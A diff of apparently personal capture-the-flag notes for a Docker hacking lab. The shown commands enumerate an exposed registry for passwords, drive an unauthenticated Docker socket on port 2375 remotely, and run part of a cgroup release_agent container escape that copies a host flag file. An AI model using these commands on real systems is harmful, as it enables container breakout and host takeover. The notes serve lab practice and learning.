@@ -3,14 +3,13 @@ curl -X GET http://docker-rodeo.thm:5000/v2/_catalog
 curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
 curl -X GET http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure | grep -i 'password'
 
-# reverse engineering docker images
-# dive
+# reverse engineering docker images 
 # https://github.com/wagoodman/dive#installation
 docker images
 dive IMAGE_ID
 
-# docker socket
-curl http://10.10.182.200:2375/version # testeando la vulnerabilidad..si nos muestra datos es vulnerable
+# docker socket 
+curl http://10.10.182.200:2375/version 
 docker -H tcp://10.10.182.200:2375 ps
 docker -H tcp://10.10.182.200:2375 run
 docker -H tcp://10.10.182.200:2375 exec
@@ -31,12 +30,7 @@ echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
 chmod a+x /exploit
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
-# docker enum:
-# revisando layers
+# docker enum - revisando layers
 docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
 docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
-
-cat manifest.json | jq
-cat f886f00520700e2ddd74a14856fcc07a360c819b4cea8cee8be83d4de01e9787.json | jq
-
 
